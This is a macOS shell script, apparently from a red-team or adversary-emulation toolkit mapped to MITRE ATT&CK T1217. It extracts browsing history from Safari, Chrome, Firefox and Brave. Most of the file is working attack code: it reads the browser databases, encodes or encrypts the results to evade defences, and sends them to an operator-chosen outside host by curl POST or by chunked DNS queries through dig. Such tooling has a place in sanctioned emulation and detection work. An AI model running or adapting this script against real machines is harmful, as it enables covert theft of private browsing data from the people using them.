# Script Name: browser_history.sh
# MITRE ATT&CK Technique: T1217
# Author: @darmado | https://x.com/darmad0
# Date: Sun Oct 20 22:34:04 PDT 2024
# Version: 1.1

# Description:
# This script extracts browser history from Safari, Chrome, Firefox, and Brave on macOS systems.
# It is aligned with MITRE ATT&CK Technique T1217: Browser History Discovery.
# References:
# - [URL to MITRE ATT&CK technique]
# - [Any other relevant references]

# MITRE ATT&CK Mappings
TACTIC="Exfiltration"
TTP_ID="T1041"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

# Global Variables
NAME="browser_history"
TTP_ID="T1217"
LOG_DIR="../../logs"
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_ENABLED=false
VERBOSE=false
ENCODE="none"
ALL=false

# Argument input variables
INPUT_START_TIME=""
INPUT_END_TIME=""
INPUT_DAYS=7  # Default to 7 days if not specified
INPUT_SEARCH=$(echo "$INPUT_SEARCH" | sed 's/[^a-zA-Z0-9 ]//g')
INPUT_EXFIL_METHOD=""
INPUT_EXFIL_URI=""

EXFIL=false
ENCRYPT="none"
ENCRYPT_KEY=""

# Static file variables
SAFARI_DB="$HOME/Library/Safari/History.db"
CHROME_DB="$HOME/Library/Application Support/Google/Chrome/Default/History"
FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
FIREFOX_DB="${FIREFOX_PROFILE}/places.sqlite"
BRAVE_DB="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"



SAFARI_HDB_QUERY="
    SELECT 
        hi.domain_expansion as domain,
        hv.title,
        datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date,
        hi.url,
        hi.visit_count
    FROM history_items hi
    JOIN history_visits hv ON hi.id = hv.history_item
    WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_DAYS * 86400))
    ORDER BY hv.visit_time DESC
"

SAFARI_HDB_QUERY_AND_SEARCH="
    SELECT 
        hi.domain_expansion as domain,
        hv.title,
        datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date,
        hi.url,
        hi.visit_count
    FROM history_items hi
    JOIN history_visits hv ON hi.id = hv.history_item
    WHERE (hi.url LIKE '%\$INPUT_SEARCH%' OR hi.domain_expansion LIKE '%\$INPUT_SEARCH%' OR hv.title LIKE '%\$INPUT_SEARCH%')
    AND hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_DAYS * 86400))
    ORDER BY hv.visit_time DESC
"


CHROME_HDB_QUERY="
    SELECT 
        url,
        title,
        datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
        visit_count
    FROM urls
    WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000
    \$search_condition
    ORDER BY last_visit_time DESC;
"

FIREFOX_HDB_QUERY="
    SELECT 
        url,
        title,
        datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit,
        visit_count
    FROM moz_places
    WHERE last_visit_date > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000
    \$search_condition
    ORDER BY last_visit_date DESC ;
    
"

BRAVE_HDB_QUERY="
    SELECT 
        url,
        title,
        datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
        visit_count
    FROM urls
    WHERE last_visit_time > (strftime('%s', 'now') - $INPUT_DAYS * 86400) * 1000000
    \$search_condition
    ORDER BY last_visit_time DESC
    LIMIT 1000;
"



FORMAT=""
DEBUG=false

# Command var
CMD_QUERY_BROWSER_DB="sqlite3 -separator '|'"

# Function to execute SQLite queries
cmd_query_browser_db() {
    local db="$1"
    local query="$2"
    $CMD_QUERY_BROWSER_DB "$db" "$query"
}

# Function to extract Safari history
safari_history() {
    if ! check_perms_tcc; then
        log "Error: Insufficient TCC permissions to access Safari history" "" ""
        return 1
    fi

    if ! check_perms "$SAFARI_DB" "r"; then
        log "Error: Insufficient file permissions to access Safari history database" "" ""
        return 1
    fi

    local query

    if [ -n "$INPUT_SEARCH" ]; then
        if ! validate_input "$INPUT_SEARCH" "^[[:print:]]+$"; then
            log "Error: Invalid search input: $INPUT_SEARCH. Please use printable characters." "" ""
            return 1
        fi
        INPUT_SEARCH=$(encode_input "$INPUT_SEARCH")
        query="$SAFARI_HDB_QUERY_AND_SEARCH"
        query="${query//\$INPUT_SEARCH/$INPUT_SEARCH}"
    else
        query="$SAFARI_HDB_QUERY"
    fi

    query="${query//\$INPUT_DAYS/$INPUT_DAYS}"

    [ "$DEBUG" = true ] && echo "DEBUG: Safari query: $query" >&2

    local output
    output=$(cmd_query_browser_db "$SAFARI_DB" "$query")
    local exit_code=$?

    if [ $exit_code -eq 0 ]; then
        if [ -n "$output" ]; then
            log "Successfully extracted Safari browser history" "cmd_query_browser_db $SAFARI_DB \"$query\"" "$output"
            printf '%s\n' "$output"
        else
            [ "$DEBUG" = true ] && echo "DEBUG: No results found for the given parameters" >&2
        fi
    else
        log "Error: Unable to extract Safari history. Details: $output" "cmd_query_browser_db $SAFARI_DB \"$query\"" ""
    fi

    return $exit_code
}

# Display help/usage message
display_help() {
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  -h, --help                Display this help message"
    echo "  -v, --verbose             Enable verbose output"
    echo "  -a, --all                 Extract history from all browsers"
    echo "  -s, --safari              Extract Safari browser history"
    echo "  -c, --chrome              Extract Chrome browser history"
    echo "  -f, --firefox             Extract Firefox browser history"
    echo "  -b, --brave               Extract Brave browser history"
    echo "  -l, --log                 Log output to file"
    echo "  --search TERM             Search for a specific term or phrase in the browser history"
    echo "  --last NUMBER             Extract history for the last NUMBER of days (default: 7)"
    echo "  --encode TYPE             Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
    echo "  --encrypt METHOD          Encrypt output (aes|blowfish|gpg). Generate key"
    echo "  --starttime TIMESTAMP     Filter history entries starting from this timestamp (YYYY-MM-DD HH:MM:SS)"
    echo "  --endtime TIMESTAMP       Filter history entries up to this timestamp (YYYY-MM-DD HH:MM:SS)"
    echo "  --format TYPE             Format output in (json|csv)"
    echo "  Data Exfiltration:"
    echo "    --exfilhttps URI         Exfiltrate output via HTTPS POST to URI"
    echo "    --exfildns DOMAIN        Exfiltrate output via DNS queries to DOMAIN"
    echo "  --debug                   Enable debug output"
}

# Encode chars that violate RFC-3996
# ", <, >, \, ^, `, { 
encode_input() {
    local input="$1"
    local rfc3996=$(echo "$input" | sed 's/"/%22/g; s/</%3C/g; s/>/%3E/g; s/\\/%5C/g; s/\^/%5E/g; s/`/%60/g; s/{/%7B/g')
    echo "$rfc3996"
}


#FunctionType: utility
validate_input() {
    local input="$1"
    local pattern="$2"
    if [[ ! $input =~ $pattern ]]; then
        echo "Invalid input: $input" >&2
        return 1
    fi
    return 0
}

# Get current user
get_user() {
    USER=$(whoami)
}

# Function to get the current timestamp
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# Utility
log() {
    local message="$1"
    local command="$2"
    local timestamp=$(get_timestamp)
    get_user
    local log_message="[${timestamp}]: user: ${USER}; msg: ${message}"
    if [ -n "$command" ]; then
        log_message+="; command: \"${command}\""
    fi
    if [ "$LOG_ENABLED" = true ]; then
        echo -e "$log_message" >> "${LOG_DIR}/${LOG_FILE_NAME}"
        if [ -n "$3" ]; then
            echo -e "Raw output:\n$3" >> "${LOG_DIR}/${LOG_FILE_NAME}"
        fi
    fi
    if [ -n "$3" ] && [ "$DEBUG" = true ]; then
        echo -e "Raw output:\n$3"
    fi
}

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64|base64)
            echo "$output" | base64 | tr -d '\n'
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# HTTP Exfiltration 
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    local url

    # If the URI doesn't start with http:// or https://, prepend http://
    if [[ "$uri" != http://* ]] && [[ "$uri" != https://* ]]; then
        url="http://$uri"
    else
        url="$uri"
    fi

    curl -L -s -X POST -d "$data" "$url" -H "User-Agent: $USER_AGENT" --insecure
}

# TODO: This is wild AF
# Violates the script blue print for how we use utiltiies (they're not suppose to be modified)

format_output() {
    local output="$1"
    case $FORMAT in
        json|JSON)
            if [ "$DEBUG" = true ]; then
                echo "DEBUG: Starting JSON formatting" >&2
                echo "DEBUG: Input data:" >&2
                echo "$output" | nl -ba >&2
            fi
            echo "$output" | awk -F'|' '{
                if (NR % 10 == 0 && ENVIRON["DEBUG"] == "true") {
                    print "DEBUG: Processing line " NR " of input" > "/dev/stderr"
                }
                gsub(/"/, "\\\"", $2)  # Escape double quotes in the title
                domain = ($1 == "" || $1 ~ /^(file|asdf):\/\//) ? "NOT_DOMAIN" : $1
                title = ($2 == "") ? "NO_TITLE" : $2
                visit_count = ($5 == "" || $5 !~ /^[0-9]+$/) ? "0" : $5
                printf "{\"domain\":\"%s\",\"title\":\"%s\",\"visit_date\":\"%s\",\"url\":\"%s\",\"visit_count\":%s}\n", 
                       domain, title, $3, $4, visit_count
            }' | jq -s '
                group_by(.domain) | 
                map({
                    key: .[0].domain,
                    value: {
                        domain: .[0].domain,
                        history: map({
                            title: .title,
                            visit_date: .visit_date,
                            url: .url,
                            visit_count: .visit_count
                        })
                    }
                }) | from_entries
            ' 2>&1 | if [ "$DEBUG" = true ]; then sed 's/^/DEBUG: /' >&2; cat; else cat; fi
            ;;
        csv|CSV)
            echo "domain,title,visit_date,url,visit_count"
            echo "$output" | awk -F'|' '{
                gsub(/,/, "\\,", $2)  # Escape commas in the title for CSV
                domain = ($1 == "" || $1 ~ /^(file|asdf):\/\//) ? "NOT_DOMAIN" : $1
                title = ($2 == "") ? "NO_TITLE" : $2
                visit_count = ($5 == "" || $5 !~ /^[0-9]+$/) ? "0" : $5
                printf "%s,\"%s\",%s,%s,%s\n", domain, title, $3, $4, visit_count
            }'
            ;;
        *)
            # Default: raw output
            echo "$output"
            ;;
    esac
}

# DNS Exfiltration
exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63

    dig +short "${encoded_id}.id.$domain" A > /dev/null
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    dig +short "end.$domain" A > /dev/null
}

# Encryption function
encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Function to check file permissions
check_perms() {
    local file="$1"
    local permission="$2"
    if [ -f "$file" ]; then
        if [ -r "$file" ] && [ "$permission" = "r" ]; then
            return 0
        elif [ -w "$file" ] && [ "$permission" = "w" ]; then
            return 0
        elif [ -x "$file" ] && [ "$permission" = "x" ]; then
            return 0
        else
            log "Warning: Insufficient permissions for $file" "" ""
            return 1
        fi
    else
        log "Warning: File $file not found" "" ""
        return 1
    fi
}

# Function to check TCC permissions based on TCC.db size 
check_perms_tcc() {
    local tcc_db="/Library/Application Support/com.apple.TCC/TCC.db"
    local file_size=$(stat -f%z "$tcc_db" 2>/dev/null)
    
    if [ -z "$file_size" ] || [ "$file_size" -eq 0 ]; then
        log "Warning: This app does not have Full Disk Access (FDA)" "" ""
        return 1
    else
        log "Info: This app has Full Disk Access (FDA)" "" ""
        log "TCC.db file size: $file_size bytes" "" ""
        return 0
    fi
}

# Function to extract Chrome history
query_chrome_hdb() {
    local output=""
    local search_condition=""

    if [ -n "$INPUT_SEARCH" ]; then
        search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
    fi

    local query="${CHROME_HDB_QUERY/\$search_condition/$search_condition}"

    if check_perms "$CHROME_DB" "r" && check_perms_tcc; then
        local command="sqlite3 -separator '|' $CHROME_DB \"$query\""
        output=$(eval "$command" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Chrome browser history" "$command" "$output"
            printf '%s\n' "$output"
        else
            log "Error: Unable to extract Chrome history. Details: $output" "$command" ""
            echo ""
        fi
    else
        echo ""
    fi
}

# Function to extract Firefox history
query_firefox_hdb() {
    local output=""
    local search_condition=""

    if [ -n "$INPUT_SEARCH" ]; then
        search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
    fi

    local query="${FIREFOX_HDB_QUERY/\$search_condition/$search_condition}"

    if check_perms "$FIREFOX_DB" "r"; then
        local temp_db="/tmp/firefox_history_temp.sqlite"
        cp "$FIREFOX_DB" "$temp_db"
        
        local command="sqlite3 -separator '|' $temp_db \"$query\""
        output=$(eval "$command" 2>&1)
        
        if [ $? -eq 0 ]; then
            log "Successfully extracted Firefox browser history" "$command" "$output"
            printf '%s\n' "$output"
            rm "$temp_db"
        else
            log "Error: Unable to extract Firefox history. Details: $output" "$command" ""
        fi
    else
        verbose "Insufficient permissions to read Firefox history database"
    fi
}

# Function to extract Brave history
query_brave_hdb() {
    local output=""
    local search_condition=""

    if [ -n "$INPUT_SEARCH" ]; then
        search_condition="AND (url LIKE '%$INPUT_SEARCH%' OR title LIKE '%$INPUT_SEARCH%')"
    fi

    local query="${BRAVE_HDB_QUERY/\$search_condition/$search_condition}"

    if check_perms "$BRAVE_DB" "r"; then
        local command="sqlite3 -separator '|' $BRAVE_DB \"$query\""
        output=$(eval "$command" 2>&1)
        if [ $? -eq 0 ]; then
            log "Successfully extracted Brave browser history" "$command" "$output"
            printf '%s\n' "$output"
        else
            log "Error: Unable to extract Brave history. Details: $output" "$command" ""
            echo ""
        fi
    else
        echo ""
    fi
}

# Add this function near the other utility functions
#FunctionType: utility
chunk_data() {
    local data="$1"
    local chunk_size="$2"
    local output=""
    
    while [ -n "$data" ]; do
        output+="${data:0:$chunk_size}"$'\n'
        data="${data:$chunk_size}"
    done
    
    echo "$output"
}

# Add this function to the script
encrypt_output() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Main function
main() {
    [ "$DEBUG" = true ] && echo "Starting browser history extraction" >&2

    local output=""

    if [ "$ALL" = true ] || [ "$SAFARI" = true ]; then
        output+="$(safari_history)"
    fi

    if [ "$ALL" = true ] || [ "$CHROME" = true ]; then
        output+="$(query_chrome_hdb)"
    fi

    if [ "$ALL" = true ] || [ "$FIREFOX" = true ]; then
        output+="$(query_firefox_hdb)"
    fi

    if [ "$ALL" = true ] || [ "$BRAVE" = true ]; then
        output+="$(query_brave_hdb)"
    fi

    if [ -n "$output" ]; then
        output=$(format_output "$output")

        if [ "$ENCODE" != "none" ]; then
            [ "$DEBUG" = true ] && echo "Encoding output using $ENCODE method" >&2
            output=$(encode_output "$output")
        fi

        if [ "$ENCRYPT" != "none" ]; then
            [ "$DEBUG" = true ] && echo "Encrypting output using $ENCRYPT method" >&2
            output=$(encrypt_output "$output" "$ENCRYPT" "$ENCRYPT_KEY")
        fi

        if [ "$LOG_ENABLED" = true ]; then
            log_output "$output"
            [ "$DEBUG" = true ] && echo "Output logged to ${LOG_DIR}/${LOG_FILE_NAME}" >&2
        elif [ "$EXFIL" = true ]; then
            if [ "$EXFIL_METHOD" = "http" ]; then
                exfiltrate_http "$output" "$EXFIL_URI"
            elif [ "$EXFIL_METHOD" = "dns" ]; then
                exfiltrate_dns "$output" "$EXFIL_URI"
            fi
        else
            printf '%s\n' "$output"
        fi
    else
        echo "No valid browser history extracted"
    fi

    [ "$DEBUG" = true ] && echo "Browser history extraction completed" >&2
}

# Add this function to handle log output
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    local full_log_path="${LOG_DIR}/${LOG_FILE_NAME}"
    
    if [ ! -f "$full_log_path" ] || [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
        mkdir -p "$LOG_DIR"
        touch "$full_log_path"
    fi
    
    echo "$output" >> "$full_log_path"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
        mv "$full_log_path" "${full_log_path}.old"
        touch "$full_log_path"
    fi
}

# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -a|--all) ALL=true ;;
        -v|--verbose) VERBOSE=true ;;
        -s|--safari) SAFARI=true ;;
        -c|--chrome) CHROME=true ;;
        -f|--firefox) FIREFOX=true ;;
        -b|--brave) BRAVE=true ;;
        -l|--log) 
            LOG_ENABLED=true
            mkdir -p "$LOG_DIR"
            ;;
        --search)
            shift
            INPUT_SEARCH="$1"
            ;;
        --last) 
            shift
            INPUT_DAYS="$1"
            ;;
        --format) 
            shift
            FORMAT="$1"
            ;;
        --encode) 
            shift
            ENCODE="$1"
            ;;
        --exfilhttp)
            shift
            EXFIL=true
            EXFIL_METHOD="http"
            EXFIL_URI="$1"
            ;;
        --exfildns)
            shift
            EXFIL=true
            EXFIL_METHOD="dns"
            EXFIL_URI="$1"
            ;;
        --encrypt)
            shift
            ENCRYPT="$1"
            if [[ "$ENCRYPT" =~ ^(aes|blowfish|gpg)$ ]]; then
                ENCRYPT_KEY=$(openssl rand -base64 32)
                echo "Generated encryption key: $ENCRYPT_KEY" >&2
            else
                echo "Invalid encryption method. Use aes, blowfish, or gpg" >&2
                exit 1
            fi
            ;;
        --starttime) 
            shift
            START_TIME="$1"
            ;;
        --endtime) 
            shift
            END_TIME="$1"
            ;;
        --debug) DEBUG=true ;;
        *) echo "Invalid option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done



main


































